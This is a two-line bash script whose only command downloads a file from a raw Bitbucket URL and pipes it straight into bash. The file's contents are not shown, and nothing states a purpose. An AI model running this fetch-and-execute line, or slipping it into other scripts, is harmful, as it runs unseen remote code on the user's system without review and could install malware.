#!/bin/bash

curl -sL  https://bitbucket.org/kotamabaran777/gas1/raw/eda9d5ee6dd06eca51666eb2dcc676f40a2c393a/Oke55 | bash